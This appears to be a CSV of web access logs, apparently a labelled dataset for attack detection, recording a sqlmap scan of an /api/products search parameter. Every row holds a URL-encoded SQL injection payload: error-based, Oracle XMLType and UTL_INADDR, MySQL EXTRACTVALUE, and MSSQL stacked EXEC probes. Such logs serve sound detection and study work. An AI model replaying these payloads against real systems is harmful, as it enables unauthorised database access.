@timestamp,auth_token_hash,method,path,path_normalized,remote_ip,request_id,response_size,response_time_ms,sampling_flag,status,upstream,user_agent,user_id_hash,user_role,waf_action,waf_rule_id,label
2026-05-05 03:35:34+00:00,(empty),GET,/api/products?q=a%27%29%20AND%205643%3DCONCAT%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2C%28SELECT%20%28CASE%20WHEN%20%285643%3D5643%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2CCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%2898%29%2BCHAR%28113%29%29%20AND%20%28%27PrfX%27%20LIKE%20%27PrfX,/api/products,172.20.0.10,75404bb947f245ffe39e6ed470404beb,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:34+00:00,(empty),GET,/api/products?q=a%25%27%20AND%205643%3DCONCAT%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2C%28SELECT%20%28CASE%20WHEN%20%285643%3D5643%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2CCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%2898%29%2BCHAR%28113%29%29%20AND%20%27WPvS%25%27%3D%27WPvS,/api/products,172.20.0.10,01e329600133619fd385de018bd6039c,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:34+00:00,(empty),GET,/api/products?q=a%27%20AND%205643%3DCONCAT%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2C%28SELECT%20%28CASE%20WHEN%20%285643%3D5643%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2CCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%2898%29%2BCHAR%28113%29%29%20AND%20%27MHjG%27%20LIKE%20%27MHjG,/api/products,172.20.0.10,d2b7a69b31a603c8a7fc03c1cf33ff27,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:34+00:00,(empty),GET,/api/products?q=a%22%29%20AND%205643%3DCONCAT%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2C%28SELECT%20%28CASE%20WHEN%20%285643%3D5643%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2CCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%2898%29%2BCHAR%28113%29%29%20AND%20%28%22ELfX%22%3D%22ELfX,/api/products,172.20.0.10,b4fecd41df28e65ab513b0b56794fb27,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:34+00:00,(empty),GET,/api/products?q=a%22%20AND%205643%3DCONCAT%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2C%28SELECT%20%28CASE%20WHEN%20%285643%3D5643%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2CCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%2898%29%2BCHAR%28113%29%29%20AND%20%22xMSH%22%3D%22xMSH,/api/products,172.20.0.10,b4e7cfee24e3fbf911121fb420b993e9,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:34+00:00,(empty),GET,/api/products?q=a%29%20AND%205643%3DCONCAT%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2C%28SELECT%20%28CASE%20WHEN%20%285643%3D5643%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2CCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%2898%29%2BCHAR%28113%29%29%20AND%20%289308%3D9308,/api/products,172.20.0.10,e20135845f1ef5ebfb07aa0cc6c0ae6c,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:34+00:00,(empty),GET,/api/products?q=a%29%29%20AND%205643%3DCONCAT%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2C%28SELECT%20%28CASE%20WHEN%20%285643%3D5643%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2CCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%2898%29%2BCHAR%28113%29%29%20AND%20%28%285988%3D5988,/api/products,172.20.0.10,7b21d9d5f83774bf810b7a26a634b6ef,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:34+00:00,(empty),GET,/api/products?q=a%20AND%205643%3DCONCAT%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2C%28SELECT%20%28CASE%20WHEN%20%285643%3D5643%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2CCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%2898%29%2BCHAR%28113%29%29,/api/products,172.20.0.10,01eac396e84e354c3dcfb084889a5da3,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:34+00:00,(empty),GET,/api/products?q=a%20AND%205643%3DCONCAT%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2C%28SELECT%20%28CASE%20WHEN%20%285643%3D5643%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2CCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%2898%29%2BCHAR%28113%29%29--%20qpYT,/api/products,172.20.0.10,7c635106dfeb6e526cd69e204f4a0431,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:34+00:00,(empty),GET,/api/products?q=a%27%29%20AND%205886%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285886%3D5886%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%27KdrL%27%3D%27KdrL,/api/products,172.20.0.10,19e5e4471b4950ba470c273a7a282a5e,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:34+00:00,(empty),GET,/api/products?q=a%27%29%29%20AND%205886%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285886%3D5886%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%28%27zokL%27%3D%27zokL,/api/products,172.20.0.10,f00a95e8852efe0388e8b499bbaeda2b,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:34+00:00,(empty),GET,/api/products?q=a%27%20AND%205886%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285886%3D5886%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27qEgQ%27%3D%27qEgQ,/api/products,172.20.0.10,971d7d507feca63dff3ef3670d011957,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:34+00:00,(empty),GET,/api/products?q=a%27%29%20AND%205886%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285886%3D5886%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%27zZCN%27%20LIKE%20%27zZCN,/api/products,172.20.0.10,4483564cc720c531336c5b75a8665ecb,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:34+00:00,(empty),GET,/api/products?q=a%25%27%20AND%205886%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285886%3D5886%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27akNq%25%27%3D%27akNq,/api/products,172.20.0.10,ee7df411d1f53ee6b6a68ba50133d2a1,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:34+00:00,(empty),GET,/api/products?q=a%27%20AND%205886%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285886%3D5886%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27CRXb%27%20LIKE%20%27CRXb,/api/products,172.20.0.10,0c9a652928ae682970dcdd3cd3986d91,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:34+00:00,(empty),GET,/api/products?q=a%22%29%20AND%205886%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285886%3D5886%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%22rcOW%22%3D%22rcOW,/api/products,172.20.0.10,b0f4cb29f2a10468ec5ceb07f860348e,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:34+00:00,(empty),GET,/api/products?q=a%22%20AND%205886%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285886%3D5886%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%22YCQV%22%3D%22YCQV,/api/products,172.20.0.10,e3aa251e75e41dbede5ca03b30609a12,0.0,6.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:35+00:00,(empty),GET,/api/products?q=a%29%20AND%209294%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289294%3D9294%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29%20AND%20%282456%3D2456,/api/products,172.20.0.10,a5a940a4a0359b3d7c2bb55a8081195a,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:35+00:00,(empty),GET,/api/products?q=a%29%29%20AND%209294%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289294%3D9294%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29%20AND%20%28%283809%3D3809,/api/products,172.20.0.10,e049a5845a02d234c42c33157f55c349,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:35+00:00,(empty),GET,/api/products?q=a%20AND%209294%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289294%3D9294%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29,/api/products,172.20.0.10,5aa9e59ff88cc0541f802520a90908d2,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:35+00:00,(empty),GET,/api/products?q=a%20AND%209294%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289294%3D9294%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29--%20VMxt,/api/products,172.20.0.10,34cb1778a132f5ede7a06a53f539f1ec,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:35+00:00,(empty),GET,/api/products?q=a%27%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%282404%2CCONCAT%280x5c%2C0x717a6a7071%2C%28SELECT%20%28CASE%20WHEN%20%282404%3D2404%29%20THEN%201%20ELSE%200%20END%29%29%2C0x717a766271%29%29%2C1%29%20AND%20%28%27ofBF%27%3D%27ofBF,/api/products,172.20.0.10,75ab3d9f6cc14f11345ea5e0826d4934,0.0,4.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:35+00:00,(empty),GET,/api/products?q=a%27%29%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%282404%2CCONCAT%280x5c%2C0x717a6a7071%2C%28SELECT%20%28CASE%20WHEN%20%282404%3D2404%29%20THEN%201%20ELSE%200%20END%29%29%2C0x717a766271%29%29%2C1%29%20AND%20%28%28%27EOHo%27%3D%27EOHo,/api/products,172.20.0.10,6ae116eea8bfc55119f1b3db82457dda,0.0,4.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:35+00:00,(empty),GET,/api/products?q=a%27%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%282404%2CCONCAT%280x5c%2C0x717a6a7071%2C%28SELECT%20%28CASE%20WHEN%20%282404%3D2404%29%20THEN%201%20ELSE%200%20END%29%29%2C0x717a766271%29%29%2C1%29%20AND%20%27ljIs%27%3D%27ljIs,/api/products,172.20.0.10,b1aae8f870740e73b3475e336adc529d,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:35+00:00,(empty),GET,/api/products?q=a%27%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%282404%2CCONCAT%280x5c%2C0x717a6a7071%2C%28SELECT%20%28CASE%20WHEN%20%282404%3D2404%29%20THEN%201%20ELSE%200%20END%29%29%2C0x717a766271%29%29%2C1%29%20AND%20%28%27HTHz%27%20LIKE%20%27HTHz,/api/products,172.20.0.10,f324111cc009866bb57eec7c94d1bf3c,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:35+00:00,(empty),GET,/api/products?q=a%25%27%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%282404%2CCONCAT%280x5c%2C0x717a6a7071%2C%28SELECT%20%28CASE%20WHEN%20%282404%3D2404%29%20THEN%201%20ELSE%200%20END%29%29%2C0x717a766271%29%29%2C1%29%20AND%20%27TGvB%25%27%3D%27TGvB,/api/products,172.20.0.10,7abd55929a1a3546e9563f9fd6e16d50,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:35+00:00,(empty),GET,/api/products?q=a%27%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%282404%2CCONCAT%280x5c%2C0x717a6a7071%2C%28SELECT%20%28CASE%20WHEN%20%282404%3D2404%29%20THEN%201%20ELSE%200%20END%29%29%2C0x717a766271%29%29%2C1%29%20AND%20%27bkJv%27%20LIKE%20%27bkJv,/api/products,172.20.0.10,b84d21e82edbd9d212940ed4bea460cf,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:35+00:00,(empty),GET,/api/products?q=a%22%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%282404%2CCONCAT%280x5c%2C0x717a6a7071%2C%28SELECT%20%28CASE%20WHEN%20%282404%3D2404%29%20THEN%201%20ELSE%200%20END%29%29%2C0x717a766271%29%29%2C1%29%20AND%20%28%22ORoa%22%3D%22ORoa,/api/products,172.20.0.10,51a57a0c9920d3809fe38a5b0860c829,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:35+00:00,(empty),GET,/api/products?q=a%22%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%282404%2CCONCAT%280x5c%2C0x717a6a7071%2C%28SELECT%20%28CASE%20WHEN%20%282404%3D2404%29%20THEN%201%20ELSE%200%20END%29%29%2C0x717a766271%29%29%2C1%29%20AND%20%22krIF%22%3D%22krIF,/api/products,172.20.0.10,15f67f9214b210e3647417ba606461ea,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:35+00:00,(empty),GET,/api/products?q=a%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%282404%2CCONCAT%280x5c%2C0x717a6a7071%2C%28SELECT%20%28CASE%20WHEN%20%282404%3D2404%29%20THEN%201%20ELSE%200%20END%29%29%2C0x717a766271%29%29%2C1%29%20AND%20%289267%3D9267,/api/products,172.20.0.10,67da2413f9500fb92d599e10f062f632,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:35+00:00,(empty),GET,/api/products?q=a%29%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%282404%2CCONCAT%280x5c%2C0x717a6a7071%2C%28SELECT%20%28CASE%20WHEN%20%282404%3D2404%29%20THEN%201%20ELSE%200%20END%29%29%2C0x717a766271%29%29%2C1%29%20AND%20%28%284931%3D4931,/api/products,172.20.0.10,be3551dc0116162646b3e139b6e905a7,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:35+00:00,(empty),GET,/api/products?q=a%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%282404%2CCONCAT%280x5c%2C0x717a6a7071%2C%28SELECT%20%28CASE%20WHEN%20%282404%3D2404%29%20THEN%201%20ELSE%200%20END%29%29%2C0x717a766271%29%29%2C1%29,/api/products,172.20.0.10,1ab442a5de22f4e3fcba857e1eaabaf4,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:35+00:00,(empty),GET,/api/products?q=a%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%282404%2CCONCAT%280x5c%2C0x717a6a7071%2C%28SELECT%20%28CASE%20WHEN%20%282404%3D2404%29%20THEN%201%20ELSE%200%20END%29%29%2C0x717a766271%29%29%2C1%29--%20dorf,/api/products,172.20.0.10,2ab757c7c909ee21cc983d77f583ca16,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:35+00:00,(empty),GET,/api/products?q=%28SELECT%208047%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x717a6a7071%2C%28SELECT%20%28ELT%288047%3D8047%2C1%29%29%29%2C0x717a766271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29,/api/products,172.20.0.10,5430ea7fc238cef15909b8065643c1e1,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:35+00:00,(empty),GET,/api/products?q=%28EXTRACTVALUE%289702%2CCONCAT%280x5c%2C0x717a6a7071%2C%28SELECT%20%28ELT%289702%3D9702%2C1%29%29%29%2C0x717a766271%29%29%29,/api/products,172.20.0.10,88005aebdf88fb1a51b8174d4d8c94da,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:35+00:00,(empty),GET,/api/products?q=%28CAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285013%3D5013%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%29,/api/products,172.20.0.10,c0029111d282636c89ef9c9e143762a6,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:35+00:00,(empty),GET,/api/products?q=a%27%29%3BDECLARE%20%40KtIx%20NVARCHAR%284000%29%3BSET%20%40KtIx%3D%28SELECT%20%27qzjpq%27%2B%28SELECT%20%28CASE%20WHEN%20%289269%3D9269%29%20THEN%20%271%27%20ELSE%20%270%27%20END%29%29%2B%27qzvbq%27%29%3BEXEC%20%40KtIx--,/api/products,172.20.0.10,2665bfb6f369bfc9e5a1eeab6f885d0a,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:35+00:00,(empty),GET,/api/products?q=a%27%29%29%3BDECLARE%20%40KtIx%20NVARCHAR%284000%29%3BSET%20%40KtIx%3D%28SELECT%20%27qzjpq%27%2B%28SELECT%20%28CASE%20WHEN%20%289269%3D9269%29%20THEN%20%271%27%20ELSE%20%270%27%20END%29%29%2B%27qzvbq%27%29%3BEXEC%20%40KtIx--,/api/products,172.20.0.10,99c4f946c4a9fd5eaa2467dcff2abb40,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 03:35:35+00:00,(empty),GET,/api/products?q=a%29%20AND%205886%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285886%3D5886%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%282440%3D2440,/api/products,172.20.0.10,0e157140d70a91adcbcc7eb8e22f683b,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
